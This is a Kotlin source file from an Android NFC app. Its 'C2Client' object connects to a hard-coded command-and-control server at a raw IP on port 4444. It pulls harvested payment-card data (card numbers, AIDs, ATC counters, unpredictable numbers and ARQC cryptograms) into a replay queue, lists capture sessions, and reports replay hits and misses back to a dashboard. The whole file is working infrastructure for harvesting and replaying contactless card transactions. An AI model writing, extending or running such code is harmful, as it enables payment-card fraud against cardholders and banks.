package xyz.nfc.moksha

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

data class RemoteHarvest(
    val pan:     String,
    val aid:     String,
    val atcHex:  String,
    val unHex:   String,
    val arqcHex: String
)

data class SessionData(
    val id:          Int,
    val pan:         String,
    val aid:         String,
    val network:     String,
    val ts:          Long,
    val sampleCount: Int,
    val transactions: List<RemoteHarvest>
)

object C2Client {
    private const val TAG     = "C2Client"
    const val BASE_URL        = "http://172.104.207.107:4444"
    private const val TIMEOUT = 5_000

    /** Collector API key. Matches what NFC Probe uses and what dashboard shows. */
    var apiKey: String = "research-1"

    private fun openConn(path: String, method: String = "GET"): HttpURLConnection =
        (URL("$BASE_URL$path").openConnection() as HttpURLConnection).apply {
            requestMethod = method
            connectTimeout = TIMEOUT
            readTimeout    = TIMEOUT
            setRequestProperty("Accept", "application/json")
            setRequestProperty("Authorization", "Bearer $apiKey")
        }

    /** Fetch dashboard-selected replay queue from /api/replay. */
    fun fetchHarvests(): List<RemoteHarvest> {
        return try {
            val conn = openConn("/api/replay")
            val code = conn.responseCode
            if (code != 200) { Log.w(TAG, "C2 returned HTTP $code"); conn.disconnect(); return emptyList() }
            val body = conn.inputStream.bufferedReader().readText()
            conn.disconnect()
            val arr = JSONArray(body)
            val out = mutableListOf<RemoteHarvest>()
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                out += RemoteHarvest(
                    pan     = o.optString("pan"),
                    aid     = o.optString("aid"),
                    atcHex  = o.optString("atc_hex").uppercase(),
                    unHex   = o.optString("un_hex").uppercase(),
                    arqcHex = o.optString("arqc_hex").uppercase()
                )
            }
            Log.i(TAG, "Fetched ${out.size} replay records")
            out
        } catch (e: Exception) {
            Log.e(TAG, "fetchHarvests failed: ${e.message}")
            emptyList()
        }
    }

    /** Fetch all capture sessions from /api/sessions so the user can pick one. */
    fun fetchSessions(): List<SessionData> {
        return try {
            val conn = openConn("/api/sessions")
            val code = conn.responseCode
            if (code != 200) { Log.w(TAG, "sessions HTTP $code"); conn.disconnect(); return emptyList() }
            val body = conn.inputStream.bufferedReader().readText()
            conn.disconnect()

            val arr = JSONArray(body)
            val out = mutableListOf<SessionData>()
            for (i in 0 until arr.length()) {
                val s  = arr.getJSONObject(i)
                val ta = s.optJSONArray("transactions")
                val txs = mutableListOf<RemoteHarvest>()
                if (ta != null) {
                    for (j in 0 until ta.length()) {
                        val t  = ta.getJSONObject(j)
                        val un = t.optString("un").uppercase()
                        val ac = t.optString("arqc").uppercase()
                        if (un.isEmpty() || ac.isEmpty()) continue
                        txs += RemoteHarvest(
                            pan     = s.optString("pan"),
                            aid     = s.optString("aid"),
                            atcHex  = t.optString("atc").uppercase(),
                            unHex   = un,
                            arqcHex = ac
                        )
                    }
                }
                out += SessionData(
                    id           = s.optInt("id"),
                    pan          = s.optString("pan"),
                    aid          = s.optString("aid"),
                    network      = s.optString("network"),
                    ts           = s.optLong("ts"),
                    sampleCount  = s.optInt("sample_count"),
                    transactions = txs
                )
            }
            Log.i(TAG, "Fetched ${out.size} sessions")
            out
        } catch (e: Exception) {
            Log.e(TAG, "fetchSessions failed: ${e.message}")
            emptyList()
        }
    }

    /**
     * Report a REPLAY HIT or MISS back to the dashboard.
     * Called from a background thread — never on main thread.
     */
    fun reportReplayResult(unHex: String, arqcHex: String, hit: Boolean) {
        try {
            val conn = openConn("/api/replay_result", "POST").apply {
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
            }
            val body = JSONObject().apply {
                put("un_hex",   unHex)
                put("arqc_hex", arqcHex)
                put("hit",      hit)
                put("api_key",  apiKey)
            }.toString().toByteArray(Charsets.UTF_8)
            conn.outputStream.write(body)
            conn.outputStream.flush()
            val code = conn.responseCode
            conn.disconnect()
            Log.i(TAG, "reportReplayResult UN=$unHex hit=$hit → HTTP $code")
        } catch (e: Exception) {
            Log.w(TAG, "reportReplayResult failed: ${e.message}")
        }
    }
}
